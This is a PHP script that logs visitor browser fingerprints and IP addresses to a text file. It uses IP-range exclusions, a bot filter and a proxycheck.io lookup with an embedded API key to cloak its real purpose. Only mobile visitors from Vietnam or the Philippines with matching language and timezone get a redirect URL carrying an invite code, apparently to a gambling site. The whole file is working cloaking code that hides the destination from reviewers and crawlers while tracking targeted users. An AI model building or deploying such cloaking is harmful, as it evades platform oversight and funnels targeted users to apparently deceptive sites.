<?php

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = json_decode(file_get_contents('php://input'), true);

    if ($data) {
        $ip = $_SERVER['REMOTE_ADDR'];
        $data["ipAddress"] = $ip;
        $data["date"] = date("Y-m-d H:i:s");
        $data["valid"] = false;
        
        require_once 'MobileDetect.php';
        $detect = new Detection\MobileDetect();
        if ($detect->isMobile() && !isBot()) {
            if (!ip_in_range("66.0.0.0", "66.255.255.255", $ip) && !ip_in_range("54.0.0.0", "54.255.255.255", $ip) && !ip_in_range("51.0.0.0", "51.255.255.255", $ip)) {
                $response = CallAPI("GET", "https://proxycheck.io/v2/" . $ip . "?key=0094jg-o37967-r50017-77l675&vpn=1&asn=1"); 
                $response = json_decode($response);
                if (($response->$ip->isocode == "VN" || $response->$ip->isocode == "PH") && $response->$ip->proxy === "no" && ($data["language"] === "vi-VN") && ($data["timeZoneOffset"] == 7 || $data["timeZoneOffset"] == 8)){
                    $webUrl = "https://onfaker.com/?inviteCode=ttnohu88";
                    $data["valid"] = true;
                    echo json_encode([
                        'status' => 'success', 
                        'successUrl' => $webUrl
                    ]);
                }
            }
        }

        // Lưu fingerprint vào file
        file_put_contents('fingerprints.txt', json_encode($data) . PHP_EOL, FILE_APPEND);
    }
}

function CallAPI($method, $url, $data = false)
    {
        $curl = curl_init();
    
        switch ($method)
        {
            case "POST":
                curl_setopt($curl, CURLOPT_POST, 1);
    
                if ($data)
                    curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
                break;
            case "PUT":
                curl_setopt($curl, CURLOPT_PUT, 1);
                break;
            default:
                if ($data)
                    $url = sprintf("%s?%s", $url, http_build_query($data));
        }
    
        // Optional Authentication:
        curl_setopt($curl, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
        curl_setopt($curl, CURLOPT_USERPWD, "username:password");
    
        curl_setopt($curl, CURLOPT_URL, $url);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    
        $result = curl_exec($curl);
    
        curl_close($curl);
    
        return $result;
    }

    
    # We need to be able to check if an ip_address in a particular range
    function ip_in_range($lower_range_ip_address, $upper_range_ip_address, $needle_ip_address)
    {
        # Get the numeric reprisentation of the IP Address with IP2long
        $min    = ip2long($lower_range_ip_address);
        $max    = ip2long($upper_range_ip_address);
        $needle = ip2long($needle_ip_address);            

        # Then it's as simple as checking whether the needle falls between the lower and upper ranges
        return (($needle >= $min) AND ($needle <= $max));
    }    

    function isBot() {
         return (
            isset($_SERVER['HTTP_USER_AGENT'])
            && preg_match('/bot|crawl|slurp|spider|mediapartners/i', $_SERVER['HTTP_USER_AGENT'])
          );
    }
    function getUserIP()
    {
        // Get real visitor IP behind CloudFlare network
        if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
                  $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
                  $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
        }
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];
    
        if(filter_var($client, FILTER_VALIDATE_IP))
        {
            $ip = $client;
        }
        elseif(filter_var($forward, FILTER_VALIDATE_IP))
        {
            $ip = $forward;
        }
        else
        {
            $ip = $remote;
        }
    
        return $ip;
    }
?>
